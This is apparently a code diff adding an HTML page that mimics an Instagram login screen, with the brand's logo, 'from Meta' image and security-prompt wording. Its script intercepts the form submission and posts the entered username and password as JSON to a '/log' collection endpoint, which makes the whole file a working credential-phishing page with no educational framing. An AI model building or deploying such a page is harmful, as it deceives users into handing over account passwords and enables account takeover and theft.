@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Page</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-white flex flex-col items-center justify-between min-h-screen">
+    <img src="InstagramLogo.png" alt="">
+
+    <!-- Login Form -->
+    <div class="w-full max-w-xs">
+        <form id="login-form" class="bg-white rounded px-8 pb-8 mb-4">
+            <div class="mb-4">
+                <input
+                    class="bg-gray-100 appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
+                    id="username" type="text" placeholder="Phone number, username, or email">
+            </div>
+            <div class="mb-6">
+                <input
+                    class="bg-gray-100 appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
+                    id="password" type="password" placeholder="Password">
+            </div>
+            <div class="flex items-center justify-between mb-4 text-center">
+                <a href="#" class="inline-block align-baseline font-bold text-sm text-blue-500 hover:text-blue-800">
+                    User already changed my password
+                </a>
+            </div>
+            <button
+                type="submit"
+                class="w-full bg-blue-500 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded focus:outline-none focus:shadow-outline"
+            >
+                Log in
+            </button>
+        </form>
+    </div>
+
+    <!-- Signup Link -->
+    <div class="text-center items-center">
+        <p class="text-sm">
+            Login was you? 
+            <a href="#" class="text-blue-500 font-bold hover:underline">Dismiss</a>
+        </p>
+        <img src="frommeta.png" alt="" class="mx-auto mt-4">
+    </div>
+
+    <!-- Footer -->
+    <div class="mt-10 text-sm text-gray-500">
+        <p>from <span class="font-bold text-pink-600">Your Brand</span></p>
+    </div>
+
+    <!-- Bottom Navigation Bar -->
+    <nav class="fixed bottom-0 left-0 w-full bg-white shadow-md">
+        <div class="flex justify-around py-2">
+            <!-- Add your bottom navigation buttons here -->
+        </div>
+    </nav>
+
+    <script>
+      document.getElementById('login-form').addEventListener('submit', function(event) {
+          event.preventDefault();  // Prevent form submission and page reload
+  
+          const username = document.getElementById('username').value;
+          const password = document.getElementById('password').value;
+  
+          // Send the data to the backend using fetch
+          fetch('http://localhost:3000/log', {
+              method: 'POST',
+              headers: {
+                  'Content-Type': 'application/json',
+              },
+              body: JSON.stringify({
+                  username: username,
+                  password: password
+              })
+          })
+          .then(response => response.json())
+          .then(data => {
+              console.log(data.message);  // Log success message
+          })
+          .catch(error => {
+              console.error('Error logging data:', error);
+          });
+      });
+  </script>
+  
+</body>
+</html>
